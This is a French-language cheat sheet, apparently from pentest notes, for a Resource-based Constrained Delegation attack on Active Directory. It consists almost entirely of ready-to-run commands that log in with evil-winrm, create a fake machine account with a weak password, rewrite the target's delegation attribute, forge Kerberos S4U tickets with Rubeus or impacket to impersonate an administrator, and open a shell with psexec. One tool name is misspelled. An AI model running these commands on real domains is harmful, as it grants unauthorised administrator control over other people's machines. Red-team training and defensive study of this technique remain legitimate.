# Resource-based Constrained Delegation

_**Note :** Cette attaque est possible si un utilisateur dispose des droits "GenericAll" sur un objet ordinateur._

_**Objectif :** Devenir administrateur de l'objet ordinateur (\<MACHINE-CIBLE>)._

<pre><code><strong>### Connexion à une machine du domaine
</strong><strong>$ evil-winrm -u "&#x3C;USER>" -p '&#x3C;PASSWORD>' -i &#x3C;MACHINE-DU-DOMAINE> -s /home/kali/tools/
</strong>#>PowerView.ps1
#>Powermad.ps1
#>upload Rubeus.exe

### Conditions

#>Get-DomainObject -Identity "dc=domain,dc=com" -Domain domain.com -> Suppérieur à 0
#>Get-DomainController -> Suppérieur ou égale à 2012
#>Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity -> Vide

### Réalisation de l'attaque

#### Création d'une fausse machine sur le domaine
#>New-MachineAccount -MachineAccount &#x3C;FAKE-MACHINE> -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
#>Get-DomainComputer &#x3C;FAKE-MACHINE> -> Récupération du SID

#### Indiquer à &#x3C;MACHINE-CIBLE> qu'elle doit faire confiance au compte &#x3C;FAKE-MACHINE>
<strong>#>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&#x3C;SID-FAKE-MACHINE>)"
</strong>#>$SDBytes = New-Object byte[] ($SD.BinaryLength)
#>$SD.GetBinaryForm($SDBytes, 0)
#>Get-DomainComputer &#x3C;MACHINE-CIBLE> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#### Conversion du mot de passe 123456 au format RC4
#>./Rubeus.exe hash /password:123456 /user:&#x3C;FAKE-MACHINE> /domain:&#x3C;DOMAINE>

#### Génération des tickets Kerberos
##### Windows
#>./Rubeus.exe s4u /user:&#x3C;FAKE-MACHINE> /rc4:&#x3C;RC4-PASSWORD> /impersonateuser:&#x3C;ADMIN-MACHINE-CIBLE> /msdsspn:cifs/&#x3C;MACHINE-CIBLE>.&#x3C;DOMAINE> /domain:&#x3C;DOMAINE> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
##### Linux
<strong>$ impacekt-getST -spn "cifs/&#x3C;MACHINE-CIBLE>.&#x3C;DOMAINE>" -impersonate &#x3C;ADMIN-MACHINE-CIBLE> -dc-ip &#x3C;IP-DC> '&#x3C;DOMAINE>/&#x3C;FAKE-MACHINE>$:123456'
</strong>$ export KRB5CCNAME=&#x3C;ADMIN-MACHINE-CIBLE>.ccache
$ klist
$ impacket-psexec -k &#x3C;MACHINE-CIBLE>.&#x3C;DOMAINE></code></pre>
